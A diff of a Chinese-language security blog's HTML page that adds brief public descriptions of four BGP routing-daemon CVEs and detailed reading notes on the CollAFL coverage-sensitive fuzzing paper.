-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞挖掘/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/09/BGP协议的几个CVE漏洞简述/" class="post-meta-item leancloud_visitors" data-flag-title="BGP协议的几个CVE漏洞简述" title="Views">
+            <span id="/2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/" class="post-meta-item leancloud_visitors" data-flag-title="BGP协议的几个CVE漏洞简述" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/09/BGP协议的几个CVE漏洞简述/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/BGP协议的几个CVE漏洞简述/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -807,16 +811,11 @@
 
       
           <h1 id="BGP协议的几个CVE漏洞简述"><a href="#BGP协议的几个CVE漏洞简述" class="headerlink" title="BGP协议的几个CVE漏洞简述"></a>BGP协议的几个CVE漏洞简述</h1><h2 id="1-CVE-2018-5381"><a href="#1-CVE-2018-5381" class="headerlink" title="1. CVE-2018-5381"></a>1. CVE-2018-5381</h2><p>Quagga的BGP守护进程（version1.2.3之前）在解析BGP的OPEN消息的“Capabilities”时会造成拒绝服务漏洞。漏洞定位于<code>bgp_packet.c:bgp_capability_msg_parse</code>函数，如果一个多协议的“Capabilities”没有一个可识别的<code>AFI/SAFI</code>的话则会进入死循环。</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/11/09/BGP协议的几个CVE漏洞简述/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<p>AFI/SAFI: 地址族信息和子地址族信息。</p>
+<h2 id="2-CVE-2018-5378"><a href="#2-CVE-2018-5378" class="headerlink" title="2. CVE-2018-5378"></a>2. CVE-2018-5378</h2><p>如果属性长度无效，则版本1.2.3之前的Quagga BGP守护程序（bgpd）无法正确地对NOTIFY发送给Peers的数据进行边界检查。 来自bgpd进程的任意数据可能会通过网络发送到Peers，并且/或者bgpd可能会崩溃。</p>
+<h2 id="3-CVE-2019-16519"><a href="#3-CVE-2019-16519" class="headerlink" title="3. CVE-2019-16519"></a>3. CVE-2019-16519</h2><p>BIRD Internet路由守护程序1.6.x到1.6.7和2.x到2.0.5都有基于堆栈的缓冲区溢出。 当检查输入消息的有效性时，BGP守护程序对RFC 8203管理性关闭通信消息的支持包括错误的逻辑表达式。 发送具有足够消息长度的关闭通信会导致在处理消息时发生四字节的溢出，其中两个溢出字节是攻击者控制的，两个是固定的。</p>
+<h2 id="4-CVE-2017-15865"><a href="#4-CVE-2017-15865" class="headerlink" title="4. CVE-2017-15865"></a>4. CVE-2017-15865</h2><p>用于Cumulus Linux3.4.3之前和其他产品中的FRR 路由程序bgpd（2.0.2之前，3.0.2之前的3.x）存在一个漏洞，能使远程攻击者能够通过格式错误的BGP UPDATE数据包从连接的对等方获取敏感信息， 由于属性长度（即RN-690（CM-18492））处理不正确，它触发了多达数千个意外字节的传输。</p>
+
       
     </div>
 
@@ -824,97 +823,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/CollAFL阅读笔记/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/11/09/CollAFL阅读笔记/" class="post-title-link" itemprop="url">CollAFL阅读笔记</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">CollAFL阅读笔记</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-11-09 18:29:52" itemprop="dateCreated datePublished" datetime="2020-11-09T18:29:52+08:00">2020-11-09</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-18 21:59:44" itemprop="dateModified" datetime="2020-11-18T21:59:44+08:00">2020-11-18</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Read-Note/" itemprop="url" rel="index"><span itemprop="name">Read Note</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Read-Note/" itemprop="url" rel="index"><span itemprop="name">Read Note</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/11/09/CollAFL阅读笔记/" class="post-meta-item leancloud_visitors" data-flag-title="CollAFL阅读笔记" title="Views">
+            <span id="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="post-meta-item leancloud_visitors" data-flag-title="CollAFL阅读笔记" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/11/09/CollAFL阅读笔记/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/CollAFL阅读笔记/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -929,16 +910,213 @@
 
       
           <h1 id="CollAFL-Path-Sensitive-Fuzzing阅读笔记"><a href="#CollAFL-Path-Sensitive-Fuzzing阅读笔记" class="headerlink" title="CollAFL: Path Sensitive Fuzzing阅读笔记"></a>CollAFL: Path Sensitive Fuzzing阅读笔记</h1><h2 id="技术问题和挑战"><a href="#技术问题和挑战" class="headerlink" title="技术问题和挑战"></a>技术问题和挑战</h2><p>AFL采用的基于覆盖的模糊测试，采用粗略的覆盖率信息来实现高效的灰盒测试，将边缘点击计数存储在紧凑的位图中，这样的覆盖范围是不准确和不完整的。导致以下问题：</p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/11/09/CollAFL阅读笔记/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<ul>
+<li>path collisions：路径碰撞，无法发现引起new crashes的潜在路径。</li>
+<li>阻止Fuzzer做更好的fuzz 策略。</li>
+</ul>
+<h2 id="提出的解决方案"><a href="#提出的解决方案" class="headerlink" title="提出的解决方案"></a>提出的解决方案</h2><ul>
+<li>CollAFL: a coverage sensitive fuzzing solution.<ul>
+<li>在保证low instrumentation的前提下，提供更精确的覆盖率信息</li>
+<li>利用覆盖率信息实现了三种fuzz策略，更快地发现new path和bug</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>现有软件使用的基于覆盖的fuzz技术，用到的code coverage information的fuzzer很少（没有）：</p>
+<ul>
+<li>AFL：edge coverage information</li>
+<li>AFLfast：further edge coverage information</li>
+<li>VUzzer：block coverage information</li>
+</ul>
+<h3 id="覆盖范围不精确会导致什么"><a href="#覆盖范围不精确会导致什么" class="headerlink" title="覆盖范围不精确会导致什么"></a>覆盖范围不精确会导致什么</h3><ul>
+<li>path collision：如果两个不同路径的hash是一致的，则会发生路径碰撞，后测试的那条路径就会被识别先前测试的那条路径中去，后面的这条路径及其相关路径就得不到相对应的测试。</li>
+<li>fuzzing strategy：AFLfast优先选择训练路径低频的seeds，AFLgo优先选择接近于目标的seeds，这两者都需要精确的覆盖信息，不精确的覆盖范围会影响这种选择seeds的策略。</li>
+</ul>
+<h3 id="如何提高覆盖范围的准确性并引导Fuzzer"><a href="#如何提高覆盖范围的准确性并引导Fuzzer" class="headerlink" title="如何提高覆盖范围的准确性并引导Fuzzer"></a>如何提高覆盖范围的准确性并引导Fuzzer</h3><p>edge coverage提供的信息比block coverage要多，所以选择edge coverage来计算。具体如下：</p>
+<ol>
+<li>通过分析目标程序的控制流图得到已知的edges的一个列表；</li>
+<li>为每个basic block分配一个ID，然后再计算所有edges的hash。</li>
+</ol>
+<p>提出了三种新的指导Fuzzer选择seeds的策略：</p>
+<ul>
+<li>memory-access guided</li>
+<li>untouched-branch guided</li>
+<li>and untouched-descendant guided</li>
+</ul>
+<h3 id="Coverage-sensitive-fuzzing的表现"><a href="#Coverage-sensitive-fuzzing的表现" class="headerlink" title="Coverage sensitive fuzzing的表现"></a>Coverage sensitive fuzzing的表现</h3><p>Dataset：LAVA-M</p>
+<p>explore more code，find more unique crahses and security bugs.</p>
+<h2 id="2-背景和相关工作"><a href="#2-背景和相关工作" class="headerlink" title="2. 背景和相关工作"></a>2. 背景和相关工作</h2><h3 id="模糊器经常使用的产生测试用例的方法："><a href="#模糊器经常使用的产生测试用例的方法：" class="headerlink" title="模糊器经常使用的产生测试用例的方法："></a>模糊器经常使用的产生测试用例的方法：</h3><ul>
+<li>grammar-based：基于语法</li>
+<li>mutation-based：基于变异，不依赖于语法，有更好的可扩展性，代码覆盖率比较低。</li>
+</ul>
+<h3 id="覆盖引导的模糊测试："><a href="#覆盖引导的模糊测试：" class="headerlink" title="覆盖引导的模糊测试："></a>覆盖引导的模糊测试：</h3><ul>
+<li>AFL , libFuzzer, honggfuzz and VUzzer </li>
+</ul>
+<p>Workflow:</p>
+<ol>
+<li>按照某种策略从种子池中选择种子</li>
+<li>对这些种子进行编译得到一批测试用例</li>
+<li>用这些测试用例以高速状态测试应用程序</li>
+<li>监控插桩后的程序，跟踪代码覆盖率和安全问题</li>
+<li>如果检测到了安全问题（crashes、hang out）则报告漏洞</li>
+<li>筛选对代码覆盖率有作用的好的测试用例，把它放入种子池，返回step 1.</li>
+</ol>
+<p>Step3：</p>
+<ul>
+<li>AFL利用Linux提供的fork原理来加速，利用forkserver mode and persistent mode两种模式来减少的fork的载荷。</li>
+<li>AFL支持平行模式（parallel mode），允许多个fuzz实例一起运行。</li>
+</ul>
+<p>Step4:</p>
+<ul>
+<li>静态插桩: AFL 利用GCC和Clang来对源代码进行静态编译</li>
+<li>动态二进制插桩：ALF使用QEMU来对程序进行动态插桩。VUzzer则是PIN；Syzkaller和kAFL使用QEMU来对硬件（例如Intel PT）插桩。</li>
+<li>调试</li>
+<li>系统模拟</li>
+</ul>
+<p>Step5：</p>
+<ul>
+<li>大多使用AddressSanitizer来检测缓冲区溢出错误，也有其他的工具（UBSan、MemorySanitizer、LeakSanitizer、DataFlowSanitizer、ThreadSanitizer、Hex VASan）。</li>
+</ul>
+<h3 id="覆盖率跟踪："><a href="#覆盖率跟踪：" class="headerlink" title="覆盖率跟踪："></a>覆盖率跟踪：</h3><p>edge覆盖率提供的信息要优于block覆盖率。</p>
+<p>AFL采用的是edge覆盖率，但是由于生成hash的Key值的随机性，且如果edge的数量大于64K的话，就会很容易导致hash碰撞，将不同的边误认为同一条边。</p>
+<p>AFL的edge覆盖率并不精确，这很大地限制了AFL的能力。</p>
+<h3 id="种子选择策略："><a href="#种子选择策略：" class="headerlink" title="种子选择策略："></a>种子选择策略：</h3><ul>
+<li>Honggfuzz：按顺序。</li>
+<li>LibFuzzer：优先选择能命中new block的种子。</li>
+<li>VUzzer：优先选择路径较深的种子，很可能可以测试难以到达的路径。</li>
+<li>AFLfast：优先选择出现频率较少的种子，彻底测试cold path。</li>
+</ul>
+<ul>
+<li>QTEP：优先选择覆盖通过静态分析识别的错误代码的种子</li>
+<li>SlowFuzz：优先选择占用更多资源的种子（CPU、内存、energy）</li>
+<li>AFLgo：优先选择更接近于预定目标位置（例如，等待review的新commit）的种子</li>
+</ul>
+<p>本文主要针对利用代码覆盖信息直接指导模糊器去探索未知的路径。</p>
+<h3 id="种子变异策略："><a href="#种子变异策略：" class="headerlink" title="种子变异策略："></a>种子变异策略：</h3><ul>
+<li>AFL、LibFuzzer：使用一组确定性和随机算法来进行种子变异。（种子的来源、在哪里突变、突变有什么价值）</li>
+</ul>
+<p>种子的来源：</p>
+<ul>
+<li>IMF：从正常的应用程序执行中学习系统调用之间的顺序和值依赖关系，然后相应地生成测试用例，从而能够发现许多深层内核bug。</li>
+<li>Skyfire：从丰富的输入中学习一个概率上下文敏感语法来指导testcase生成。</li>
+<li>DIFUZE：利用静态分析在用户空间中组合有效的输入，以测试内核驱动程序。</li>
+<li>AI techniques：RNN、GAN。</li>
+</ul>
+<p>在哪里突变：</p>
+<ul>
+<li>VUzzer：使用控制流和数据流特性来推断要变化的字节(例如，魔术字节)，这对某些类型的数据字段很有用。</li>
+<li>Zhiqiang et.al：提出了一个解决方案来识别敏感字节的变化使用静态数据沿袭分析。</li>
+<li>Mohit Rajpal et.al：提出了一个DNN(深度神经网络)解决方案来断言哪些字节要变异，显示了有希望的改进。</li>
+<li>TaintScope：使用污染分析来识别校验和字节，并在测试期间修复它们。</li>
+</ul>
+<p>突变有什么价值：</p>
+<ul>
+<li>VUzzer：使用动态分析来推断用于突变的interesting values。</li>
+<li>Honggfuzz：在运行时识别感兴趣的值（即cmp指令的操作数），极大地提高了它的路径覆盖率。</li>
+<li>Laf-intel：转换目标应用程序，将长字符或常量比较分解为几个小的比较语句，使fuzzer能够更快地找到匹配的突变和运行新路径。</li>
+</ul>
+<h3 id="本文的重点："><a href="#本文的重点：" class="headerlink" title="本文的重点："></a>本文的重点：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005200917986.png" alt="image-20201005200917986"></p>
+<p>黄色组件为关键部分。首先提高了代码覆盖跟踪的准确性，然后通过替换种子选择策略，利用精确的覆盖信息来引导模糊器。</p>
+<h2 id="3-提高覆盖率的精确性"><a href="#3-提高覆盖率的精确性" class="headerlink" title="3. 提高覆盖率的精确性"></a>3. 提高覆盖率的精确性</h2><h3 id="覆盖粒度："><a href="#覆盖粒度：" class="headerlink" title="覆盖粒度："></a>覆盖粒度：</h3><ul>
+<li>block coverage：在测试期间跟踪每个块的命中计数。但可能会忽略某些路径，如下图：</li>
+</ul>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005201803168.png" alt="image-20201005201803168"></p>
+<ul>
+<li>edge coverage：跟踪每条边的命中次数。一个典型的实现就是AFL所使用的实现。仪器开销类似于块覆盖解决方案。但是，它不跟踪边的顺序，也丢失了一些信息。</li>
+<li>path coverage：跟踪边缘的顺序，提供最完整的代码覆盖信息。然而，路径的长度非常长，并且应用程序中的路径数量很大，因此跟踪路径覆盖的运行时开销和内存开销非常高。在实际应用中，跟踪路径覆盖是不可行的。</li>
+</ul>
+<p>因此，边缘覆盖解决方案在效率和覆盖信息之间达到了一定的平衡。然而，即使对于代表性的边缘覆盖解决方案AFL，也存在hash碰撞问题，会导致不准确。CollAFL采用边缘覆盖跟踪方案，解决了碰撞问题。</p>
+<h3 id="hash碰撞的直接解决方案："><a href="#hash碰撞的直接解决方案：" class="headerlink" title="hash碰撞的直接解决方案："></a>hash碰撞的直接解决方案：</h3><p>扩大进行散列的空间。</p>
+<p>但由于性能和随机性的原因，这并不是一个好的解决方案。</p>
+<h3 id="CollAFL的哈希冲突解决方案："><a href="#CollAFL的哈希冲突解决方案：" class="headerlink" title="CollAFL的哈希冲突解决方案："></a>CollAFL的哈希冲突解决方案：</h3><p>具体hash计算算法为公式2：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005203724140.png" alt="image-20201005203724140"></p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005203659371.png" alt="image-20201005203659371"></p>
+<p>其中x,y,z是待确定的参数，对于不同的边，这些参数可能不同。AFL使用的公式1是该算法的一种具体形式，即对所有边/块(x=0,y=1,z=0)。Fmul的计算过程与AFL相同，开销相同。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005204802750.png" alt="image-20201005204802750"></p>
+<p>目标是找到每个基本块的参数的解决方案，确保通过公式2计算的所有边的hash值都是不同的。</p>
+<p>具体来说：</p>
+<ol>
+<li><p>如果一个块B只有一个父块A：不需要找到参数&lt;x,y,z&gt;的组合。利用下面的公式3直接指定A-&gt;B这条边的hash值。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005205814002.png" alt="image-20201005205814002"></p>
+<p>其中，prev和cur是分配给A和B块的键，而参数c是一个惟一要确定的常量。</p>
+</li>
+<li><p>有多个前例块的hash算法：就使用公式2计算hash值。</p>
+<p>使用贪心算法来解析这些块的参数组合，我们把可以解析的块表示为<em>solvable blocks</em>，把不能解的块表示为<em>unsolvable blocks</em>。对于后者，使用下面的算法进行计算hash：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005211105372.png" alt="image-20201005211105372"></p>
+<p>prev和cur是A和B块的键。它建立一个离线哈希表，对所有以不可解块结尾的边使用唯一的哈希，这与其他所有边的哈希不同。在运行时，它查找这个预先计算的哈希表，以获取这些边的哈希值，使用它们的开始和结束块作为键。</p>
+</li>
+<li><p>整体缓解方案：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005211806485.png" alt="image-20201005211806485"></p>
+<p>对程序进行预处理，利用前面介绍的算法划分基本块，计算hash值。</p>
+</li>
+<li><p>具体的CalcFmul算法：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006133950479.png" alt="image-20201006133950479"></p>
+<p>首先选择一个参数y，然后迭代每个块BB，遍历的所有组合，以找到一个组合，这样以这个块结束的所有边的散列都不同于其他的散列。如果找不到组合，则此块将被归类为不可解，并放入Unsol中。否则，块将被放入Solv，参数组合将被放入Params。一旦处理了所有具有多个先例的基本块，并且Unsol集足够小，我们就找到了这个问题的解决方案。否则，我们将选择另一个参数y（1- log2（MAPSIZE）），继续前面的过程。</p>
+</li>
+<li><p>具体的CalcHash算法：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006134928799.png" alt="image-20201006134928799"></p>
+<p>如何为不可解析的多先例块建立哈希表。简而言之，它为以不可解析块结尾的每条边随机挑选未使用的散列，并将其存储在哈希映射<em>HashMap</em>中，它还返回未使用散列的自由散列集<em>FreeHashes</em>。</p>
+</li>
+</ol>
+<h3 id="性能分析："><a href="#性能分析：" class="headerlink" title="性能分析："></a>性能分析：</h3><p>三种算法的开销如下：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006173518219.png" alt="image-20201006173518219"></p>
+<p>三种情况的basic blocks数量：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006173601510.png" alt="image-20201006173601510"></p>
+<h3 id="实现细节："><a href="#实现细节：" class="headerlink" title="实现细节："></a>实现细节：</h3><ul>
+<li>使用Clang的默认实现来获取后继和前继信息。</li>
+<li>将间接调用展开为一组直接调用和一个间接调用</li>
+<li>目前CollAFL只对含有源代码的程序有用</li>
+</ul>
+<h2 id="4-优先种子选择"><a href="#4-优先种子选择" class="headerlink" title="4. 优先种子选择"></a>4. 优先种子选择</h2><p>本文实现的主要目标：直接将模糊器引导到未探索的路径上。</p>
+<ul>
+<li>突变一个具有很多未探索的相邻分支路径的种子路径</li>
+<li>突变一个具有很多未探索的相邻子节点路径的种子路径</li>
+<li>突变有很多内存访问操作的种子路径</li>
+</ul>
+<h3 id="CollAFL-br："><a href="#CollAFL-br：" class="headerlink" title="CollAFL-br："></a>CollAFL-br：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006203322701.png" alt="image-20201006203322701"></p>
+<p>其中<em>IsUntouched</em>函数当且仅当边<code>&lt;bb,bb_i&gt;</code>没有被任何先前的测试用例覆盖时返回1，否则返回0。计算的权重值是动态变化的，循环中的一个基本块对总权重的贡献更大。</p>
+<h3 id="CollAFL-desc："><a href="#CollAFL-desc：" class="headerlink" title="CollAFL-desc："></a>CollAFL-desc：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204100064.png" alt="image-20201006204100064"></p>
+<p>其中，*NumDesc(bb_i)*定义为：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204340304.png" alt="image-20201006204340304"></p>
+<p>类似地，如果testcase多次访问一个基本块，我们将迭代该块多次。</p>
+<h3 id="CollAFL-mem："><a href="#CollAFL-mem：" class="headerlink" title="CollAFL-mem："></a>CollAFL-mem：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204850105.png" alt="image-20201006204850105"></p>
+<p>其中，函数<em>NumMemInstrumentation(bb)</em> 返回参数基本块中可静态计算的内存访问操作次数。不同于前两个策略，这是可以静态确定的，类似地，如果testcase多次访问一个基本块，我们将迭代该块多次。</p>
+<h3 id="实现细节：-1"><a href="#实现细节：-1" class="headerlink" title="实现细节："></a>实现细节：</h3><p>用上面三种策略替换了AFL的默认种子选择策略，在编译时获得了每个基本块的内存访问操作的数量和子路径的数量。</p>
+<p>在运行时，在种子<em>testcase  T</em>被测试之后，我们将计算它未探索的邻居分支和子代路径，以及代表性地沿着路径的内存访问操作。更具体地说，我们将首先检查testcase的覆盖率位图，并得到这个testcase覆盖的所有边缘和命中计数。因为每条边都有一个不同的哈希，我们可以从每条边的哈希中解码它的开始和结束块。然后，对于每个块，我们将得到它的未探索邻居分支的列表，基于整体覆盖位图。再加上我们已经收集的子路径和内存访问操作的数量，我们就可以相应地计算所有三个策略的权值。</p>
+<h2 id="5-评估"><a href="#5-评估" class="headerlink" title="5. 评估"></a>5. 评估</h2><h3 id="Hash碰撞问题"><a href="#Hash碰撞问题" class="headerlink" title="Hash碰撞问题"></a>Hash碰撞问题</h3><h4 id="1-hash碰撞的普遍性："><a href="#1-hash碰撞的普遍性：" class="headerlink" title="1). hash碰撞的普遍性："></a>1). hash碰撞的普遍性：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007111648027.png" alt="image-20201007111648027"></p>
+<p>libtorrent应用程序中，超过75%的边与其他边发生碰撞，而它有超过260K条边。而AFL提供的bitmap最多能存储65.5K条边，剩下的194.5K (=260K-65.5K)边都必须与其他边碰撞。</p>
+<h4 id="2-通过扩大bitmap来减少hash碰撞的效果："><a href="#2-通过扩大bitmap来减少hash碰撞的效果：" class="headerlink" title="2). 通过扩大bitmap来减少hash碰撞的效果："></a>2). 通过扩大bitmap来减少hash碰撞的效果：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007112427549.png" alt="image-20201007112427549"></p>
+<p>如果我们位图的大小从64 KB扩大到1 MB,  libtorrent的碰撞比率从75%降至10%左右。但是带来的影响是导致Fuzzer的速度下降：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007112749574.png" alt="image-20201007112749574"></p>
+<p>当扩大到1 MB的时候，对于不同的程序，AFL的执行速度下降了30%-65%不等。而Fuzzer的执行速度对于Fuzzer来说是至关重要的，所以单纯的扩大bitmap的方法是不可行的。</p>
+<h4 id="3-CollAFL的效果："><a href="#3-CollAFL的效果：" class="headerlink" title="3). CollAFL的效果："></a>3). CollAFL的效果：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007113612722.png" alt="image-20201007113612722"></p>
+<p>使用Fsingle算法插桩的blocks要比使用Fmul的多，而前面提到的Fsingle的开销要比Fmul小，这稍微加快了一点速度。</p>
+<h3 id="代码覆盖率问题"><a href="#代码覆盖率问题" class="headerlink" title="代码覆盖率问题"></a>代码覆盖率问题</h3><h4 id="总体覆盖率改进"><a href="#总体覆盖率改进" class="headerlink" title="总体覆盖率改进"></a>总体覆盖率改进</h4><p>在200小时内探索的路径总数：</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007222228432.png" alt="image-20201007222228432"></p>
+<p>对比了AFL和CollAFL、CollAFL-mem、CollAFL-desc、CollAFL-br，发现的路径总数依次增长；对比AFLfast，CollAFL-fast平均能发现多于AFlfast 8.45%的路径总数。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007225243763.png" alt="image-20201007225243763"></p>
+<p>同上面不一样，在这里,我们使用覆盖位图计算代码覆盖率。结果都表明，CollAFL可以做得更好。</p>
+<h4 id="覆盖率随时间推移的增长情况"><a href="#覆盖率随时间推移的增长情况" class="headerlink" title="覆盖率随时间推移的增长情况"></a>覆盖率随时间推移的增长情况</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009085629675.png" alt="image-20201009085629675"></p>
+<p>CollAFL、CollAFL-fast都比AFL、AFLfast增长得快；CollAFL-br增长得比CollAFL快，说明<code>br</code>种子选择策略是最有效的；所有的Fuzzer在一开始都能找到很多path，然后在某个时间节点停了下来。</p>
+<h3 id="Unique-crashes"><a href="#Unique-crashes" class="headerlink" title="Unique crashes"></a>Unique crashes</h3><p>由于fuzz的随机性，即使找到了很多的crashes，也不一定能找到更多的vulnerabilities。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009102219647.png" alt="image-20201009102219647"></p>
+<p>以average为baseline（100%）作为比较，在200个小时内使用不同Fuzzer对不同程序进行fuzz发现的unique crashes，CollAFL(具有默认的种子选择策略)在查找唯一崩溃方面优于AFL和AFLfast。加上其余三种优化策略的CollAFL效果更好，简而言之，提出的消除hash碰撞方法效果很好。</p>
+<p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009103135189.png" alt="image-20201009103135189"></p>
+<p>对于listswf应用程序，AFLfast在一开始比CollAFLfast发现更多unique crashes，但最终被超越。</p>
